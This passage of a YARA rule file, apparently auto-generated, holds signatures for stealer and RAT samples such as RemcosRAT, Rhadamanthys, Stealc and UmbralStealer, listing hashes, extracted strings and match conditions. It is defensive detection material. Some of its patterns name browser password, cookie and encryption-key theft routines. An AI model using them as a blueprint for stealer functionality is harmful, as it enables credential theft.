      $s15 = "wrong medium type  but memory size  to non-Go memory CommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLoo" ascii /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31__8 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash).exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_4f5e6187.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_c01146e6.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_ca3808c8.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_cad617ba.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_dd76c465.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_df1ddaa4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a45a493722c85d25bc49c736120289bab6f4be902b648291bd33d992c07c61fd"
      hash2 = "4f5e618734015c7f646763a77be4bcdd8ed8111ae65939ead38a5acf74bb792a"
      hash3 = "c01146e63188972b6d9910aa9f72fbdcfd5aacc173387c79c6a775bd269c3d69"
      hash4 = "ca3808c8ff949235e3d5d547976d4b2e2bedc6b5916b0b69a798372718ecaab9"
      hash5 = "cad617ba9eff8430c285edc632632e13f72d8faff8330cacf5f71c299e96e4fc"
      hash6 = "dd76c4658847db272b8caa3140a94a810a69aec754c29f1085f41fa6bdf53d20"
      hash7 = "df1ddaa42895db3dc767b687902296dc841c352bbfe55674292e8cbc678a9b61"
   strings:
      $s1 = ".get] j_Q_Q_e.VH-OwpV T.G.z.Vk_f.x T b B_b* K E_cZ.G_FK B" fullword ascii /* score: '16.00'*/
      $s2 = "* Z/_K.H_Vb.hil.i.w8_u Lm0 z.t.2_dr C.5_" fullword ascii /* score: '12.00'*/
      $s3 = "R.Z.M B%Cs% H)t?_fw_X_y^_F|_n_M:_B.z j* d].e b_GL m b.T y.p.Puf c.q_Z f.2n" fullword ascii /* score: '12.00'*/
      $s4 = "T^_p K.iE.V O.lZA i.j_G.0.KWMfTpv.p.U.X_D)" fullword ascii /* score: '12.00'*/
      $s5 = "c Q_BJPV_f_P M q.D_p.2.V+|.1.2.i.S>U t n\\w U.k=_b.YMt W_a- t.F$ Q.p.Bh Hp_p@_R m_O_" fullword ascii /* score: '11.00'*/
      $s6 = ".0.xN m Z.rnQ B.Kk drsi j.PsK.v.N a* j F.c.e&_bb I.f{.hs m: b.5pL_" fullword ascii /* score: '11.00'*/
      $s7 = "j C n* y_f_P_d N.7 u.A.b m.nqJ_y_A.U_j.SPL,.k_a H.p.spND,.3.XY.Z q_m.W1 s p B8_" fullword ascii /* score: '11.00'*/
      $s8 = "_Y.0.k.0_X kU.Jd`.y.GcCn:r_W.GAe.5.9+ vd_h.zT{_G_iX_M_f.vj_w." fullword ascii /* score: '11.00'*/
      $s9 = "- zc_M bV1.y_H.f_X C42OW<.t.X_Q.l_RK# X_H_g.qeXF P I F m_q K0 q.x s p_i).z.Te.G.WWA E+B on W.p_" fullword ascii /* score: '11.00'*/
      $s10 = "d C.8)_PX[> h.j1T- z.p.YC_Kx.A_SIN.tNxs.7.rp.IuFa.E.j.CQhr.2.m V@ HD.Zmx W.P: l" fullword ascii /* score: '11.00'*/
      $s11 = "e T_i.w.2.Y>.X%G.X.7.l_ls.3`.jVXA.t d x`K.O2i3_p_r+ q S_hV.V)c$.bkq iB.O F7k" fullword ascii /* score: '11.00'*/
      $s12 = "Lf.D U.u%.l.93n.d F!_O.L- o.OfU.w.H_M wm8[.e.K.W ardy A_t~.l MK A4." fullword ascii /* score: '11.00'*/
      $s13 = "Mi Y A.Npa T.j I.b.V.90_Z.w| D_T_K_lXA* XB_J O.x_C YP_OYUT.t K.l.G_P_G r_x W.lz.T$u.O f_h " fullword ascii /* score: '11.00'*/
      $s14 = "_l+ QJdl k.M Y};.jCS bN.1.G.b_e L_NX.V.h z W.cQ_I d.Y.e.L" fullword ascii /* score: '11.00'*/
      $s15 = "l_V E.I.I_d b pp d V.wn_j_q fU.KeY C_f.mJ.J#,.n z_b_h.E?[jO dC L.e.ZXyn.A_f.S" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "68c812220ef41a1bea0980e196c18e31" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__f8676c0eabd52438a3e9d250ae4ce9d9_i_9 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "The Process object must have the UseShellExecute property set to false in order to start a process as a user" fullword wide /* score: '29.00'*/
      $s2 = "@System.Security.Cryptography.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '28.00'*/
      $s3 = "<System.Diagnostics.Process.dll&System.Formats.Asn1" fullword ascii /* score: '27.00'*/
      $s4 = "UnhandledUnaryHUserDefinedOpMustHaveConsistentTypesHUserDefinedOpMustHaveValidReturnTypeNLogicalOperatorMustHaveBooleanOperators" ascii /* score: '26.00'*/
      $s5 = "        publickekeytokenublickeyretargetrgetablecontentttenttypewindowsrsruntime," fullword wide /* score: '26.00'*/
      $s6 = "The Process object must have the UseShellExecute property set to false in order to redirect IO streams" fullword wide /* score: '26.00'*/
      $s7 = "The Process object must have the UseShellExecute property set to false in order to use environment variables" fullword wide /* score: '26.00'*/
      $s8 = "hSystem.Runtime.CompilerServices.IStrongBox.get_ValuehSystem.Runtime.CompilerServices.IStrongBox.set_ValueP<InitializeTlsBuckets" ascii /* score: '25.00'*/
      $s9 = "BSystem.Collections.NonGeneric.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s10 = "hSystem.Runtime.CompilerServices.IStrongBox.get_ValuehSystem.Runtime.CompilerServices.IStrongBox.set_ValueP<InitializeTlsBuckets" ascii /* score: '25.00'*/
      $s11 = ".StartWithShellExecuteEx8GetShowWindowFromWindowStyle" fullword ascii /* score: '23.00'*/
      $s12 = ".System.Formats.Asn1.dll" fullword ascii /* score: '23.00'*/
      $s13 = "<SelectAll>d__3R<<ExecuteQueryInto>g__GetResultset|13_0>d" fullword ascii /* score: '23.00'*/
      $s14 = "BSystem.Collections.Concurrent.dll:System.Collections.NonGeneric" fullword ascii /* score: '22.00'*/
      $s15 = "RestSharp.dll<System.Text.RegularExpressions" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and pe.imphash() == "f8676c0eabd52438a3e9d250ae4ce9d9" and ( 8 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_10 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
   strings:
      $s1 = "net/http.(*http2clientConnReadLoop).processHeaders" fullword ascii /* score: '23.00'*/
      $s2 = "crypto/tls.(*ecdheKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s3 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s4 = "crypto/tls.rsaKeyAgreement.processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s5 = "processClientKeyExchange" fullword ascii /* score: '20.00'*/
      $s6 = "crypto/tls.(*rsaKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s7 = "net/http.(*http2Framer).logWrite" fullword ascii /* score: '19.00'*/
      $s8 = "net/http.(*http2Transport).logf" fullword ascii /* score: '19.00'*/
      $s9 = "q*func(*tls.Config, *tls.Certificate, *tls.clientHelloMsg, *tls.serverHelloMsg) (*tls.serverKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s10 = "*x509.SystemRootsError" fullword ascii /* score: '19.00'*/
      $s11 = "f*func(*tls.Config, *tls.clientHelloMsg, *x509.Certificate) ([]uint8, *tls.clientKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s12 = "p*func(*tls.Config, *tls.clientHelloMsg, *tls.serverHelloMsg, *x509.Certificate, *tls.serverKeyExchangeMsg) error" fullword ascii /* score: '19.00'*/
      $s13 = "crypto/x509.SystemRootsError.Error" fullword ascii /* score: '19.00'*/
      $s14 = "math.Log" fullword ascii /* score: '19.00'*/
      $s15 = "crypto/x509.SystemRootsError.Unwrap" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_11 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash7 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash8 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash9 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash10 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash11 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
      hash12 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $x1 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x2 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $s3 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s9 = "Failed to allocate memory in target process" fullword wide /* score: '24.00'*/
      $s10 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
      $s11 = "icuuc.dll" fullword wide /* score: '23.00'*/
      $s12 = "icuin.dll" fullword wide /* score: '23.00'*/
      $s13 = "The specified TaskContinuationOptions combined LongRunning and ExecuteSynchronously.  Synchronous continuations should not be lo" wide /* score: '21.00'*/
      $s14 = "4SplitWithoutPostProcessing@" fullword ascii /* score: '20.00'*/
      $s15 = "System.Runtime.CompilerServices.RuntimeFeature.IsDynamicCodeSupported" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1d67dace_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_12 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1d67dace.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_870d065b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1d67dacec099bf03c40fcb8320ea5fe18a36113511f2602ce0024ec42c709713"
      hash2 = "870d065bd083e30edfa0d9f8c1dbad6c2ad69ae46d4bb9a29b786a560936900a"
   strings:
      $x1 = "C:\\Users\\asus\\source\\repos\\CafeOtomasyon\\CafeOtomasyon\\bin\\Debug\\Settings.txt" fullword wide /* score: '32.00'*/
      $s2 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '28.00'*/
      $s3 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, Pub" ascii /* score: '28.00'*/
      $s4 = "System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, S" ascii /* score: '27.00'*/
      $s5 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Font, System.Drawing, Version=4." ascii /* score: '27.00'*/
      $s6 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s7 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADa" fullword ascii /* score: '27.00'*/
      $s8 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aySystem.Windows.Forms.Im" ascii /* score: '27.00'*/
      $s9 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aySystem.Windows.Forms.Im" ascii /* score: '27.00'*/
      $s10 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s11 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '25.00'*/
      $s12 = "rawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3auSystem.Windows.Forms.Padding, System.Windows.Forms, Ve" ascii /* score: '24.00'*/
      $s13 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADP" fullword ascii /* score: '24.00'*/
      $s14 = "0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3auSystem.Windows.Forms.ImeMode, System.Windows.Forms, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s15 = "ageLayout, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.D" ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Stealc_signature__40ab50289f7ef5fae60801f88d4541fc_imphash__To_see_signature__40ab50289f7ef5fae60801f88d4541fc_imphash__To__13 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe, To-see(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe, To-see(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash)_d6f78448.exe, To-see(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash)_e93683f6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "828018b62e9aea7499623c04bc8a04634f083bf8f74026a0421fc4a79d900fd4"
      hash2 = "065eda9467973645f197c2a3e4e5c7e78f7eb96c42c3ece83ba17797a9a6b7e7"
      hash3 = "d6f7844862855bcff0732306a30c1ed572f2500d7c6ccec66f0320e06d2b6fdd"
      hash4 = "e93683f61cf5f0bc491d7c7398d925c9ad340cfdd45832d9d6c6ebf4e1c40ed5"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s10 = "OnExecutexAF" fullword ascii /* score: '18.00'*/
      $s11 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s12 = "7VAR and OUT arguments must match parameter type exactly\"%s (Version %d.%d, Build %d, %5:s):%s Service Pack %4:d (Version %1:d." wide /* score: '15.50'*/
      $s13 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s14 = "TComponent.GetObservers$1$Intf" fullword ascii /* score: '15.00'*/
      $s15 = "AppMutex" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and pe.imphash() == "40ab50289f7ef5fae60801f88d4541fc" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1a721d6a_Rhadamanthys_signature__f34d5f2d4577ed6d9ceec516c1f_14 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1a721d6a.exe, Rhadamanthys(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_107dc46a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1a721d6ad75d5a0f8f2599c661aaca62508771f4bba84e93f8401d39470c0432"
      hash2 = "107dc46aadf806fd0eebb2ebf665f74151c67924aa8a2f61901e61004b3af471"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3azSystem.Collections.Speci" ascii /* score: '27.00'*/
      $s2 = "alized.StringCollection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089PADPABj" fullword ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3azSystem.Collections.Speci" ascii /* score: '27.00'*/
      $s4 = "ExecuteNonQueryCommand" fullword wide /* score: '26.00'*/
      $s5 = "Override this property and provide custom screentip template description in DesignTime." fullword wide /* score: '22.00'*/
      $s6 = "SELECT * FROM UPLOADPROFILE_TEMPLATE WHERE GROUPCUSTOMERTRAVELLER='1' ORDER BY GROUPINDEX,ORDERNO" fullword wide /* score: '17.00'*/
      $s7 = "SELECT * FROM UPLOADPROFILE_TEMPLATE WHERE GROUPCUSTOMERTRAVELLER='2' ORDER BY GROUPINDEX,ORDERNO" fullword wide /* score: '17.00'*/
      $s8 = "SELECT * FROM UPLOADPROFILEAGENT" fullword wide /* score: '15.00'*/
      $s9 = "REFINVNO_" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s10 = "SELECT * FROM CHARGE WHERE CHARGETYPE='CC'" fullword wide /* score: '13.00'*/
      $s11 = "SELECT UPLOADPROFILE_TEMPLATE.GROUPNAME,UPLOADPROFILE_TEMPLATE.LABELNAME,UPLOADPROFILE_TEMPLATE.FIELDNAME,UPLOADPROFILE_TEMPLATE" wide /* score: '13.00'*/
      $s12 = " AND GROUPCUSTOMERTRAVELLER='2') ORDER BY UPLOADPROFILE_TEMPLATE.ORDERNO" fullword wide /* score: '13.00'*/
      $s13 = "SELECT UPLOADPROFILE_TEMPLATE.GROUPNAME,UPLOADPROFILE_TEMPLATE.LABELNAME,UPLOADPROFILE_TEMPLATE.FIELDNAME,UPLOADPROFILE_TEMPLATE" wide /* score: '13.00'*/
      $s14 = " AND GROUPCUSTOMERTRAVELLER='1') ORDER BY UPLOADPROFILE_TEMPLATE.ORDERNO" fullword wide /* score: '13.00'*/
      $s15 = "PASSPORTNAME" fullword wide /* score: '12.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7ed0d71376e55d58ab36dc7d3ffda898_imphash__RemcosRAT_signature__7ed0d71376e55d58ab36dc7d3ffda898_imphas_15 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7ed0d71376e55d58ab36dc7d3ffda898(imphash).exe, RemcosRAT(signature)_7ed0d71376e55d58ab36dc7d3ffda898(imphash)_9a86a6ad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b6847dfae6c2262cc0225c533169736c4875463adeef4adcdeb09ba0a5ab54a"
      hash2 = "9a86a6ada4acc907951a3b507a1a9bd45d70b0b3972c44ff6363f242a6669449"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "ontrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssemb" ascii /* score: '25.00'*/
      $s3 = "ndency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asI" ascii /* score: '22.00'*/
      $s4 = "cleverest.exe" fullword wide /* score: '22.00'*/
      $s5 = "nstall System v3.0b0</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Commo" ascii /* score: '13.00'*/
      $s6 = "ker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatib" ascii /* score: '10.00'*/
      $s7 = "\"#2-\\-5" fullword ascii /* score: '9.00'*/ /* hex encoded string '%' */
      $s8 = ":GExEcm" fullword ascii /* score: '9.00'*/
      $s9 = "{lYIWLr* " fullword ascii /* score: '8.00'*/
      $s10 = "qzffzar" fullword ascii /* score: '8.00'*/
      $s11 = "eikpptu" fullword ascii /* score: '8.00'*/
      $s12 = "psychotheist" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "7ed0d71376e55d58ab36dc7d3ffda898" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _UmbralStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__UmbralStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a74_16 {
   meta:
      description = "_subset_batch - from files UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_142e0913.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3a7c54c18e2d346334d6fdd81596005b7cc8ea7307d5ba42d6bb4bacf0ca1970"
      hash2 = "142e09138e86700e4de88019b753a4c3a510361af7bf8a49442772aa714bfaf9"
   strings:
      $x1 = ";Umbral.payload.Components.Browsers.Opera+<GetPasswords>d__5" fullword ascii /* score: '38.00'*/
      $x2 = "=Umbral.payload.Components.Browsers.OperaGx+<GetPasswords>d__5" fullword ascii /* score: '38.00'*/
      $x3 = "AUmbral.payload.Components.Browsers.OperaGx+<GetEncryptionKey>d__3" fullword ascii /* score: '36.00'*/
      $x4 = "9Umbral.payload.Components.Browsers.Opera+<GetCookies>d__6" fullword ascii /* score: '36.00'*/
      $x5 = "AUmbral.payload.Components.Browsers.EpicPrivacy+<GetPasswords>d__5" fullword ascii /* score: '36.00'*/
      $x6 = "8Umbral.payload.Components.Browsers.UR+<GetPasswords>d__5" fullword ascii /* score: '36.00'*/
      $x7 = "Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER" fullword wide /* score: '34.00'*/
      $x8 = ">Umbral.payload.Components.Browsers.Chromium+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x9 = "=Umbral.payload.Components.Browsers.Vivaldi+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x10 = "=Umbral.payload.Components.Browsers.Iridium+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x11 = ";Umbral.payload.Components.Browsers.OperaGx+<GetCookies>d__6" fullword ascii /* score: '33.00'*/
      $x12 = "<Umbral.payload.Components.Browsers.Chrome+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x13 = "<Umbral.payload.Components.Browsers.Yandex+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x14 = ";Umbral.payload.Components.Browsers.Brave+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x15 = "?Umbral.payload.Components.Browsers.Opera+<GetEncryptionKey>d__3" fullword ascii /* score: '33.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__17 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "runtime.mapKeyError" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mapKeyError2" fullword ascii /* score: '21.00'*/
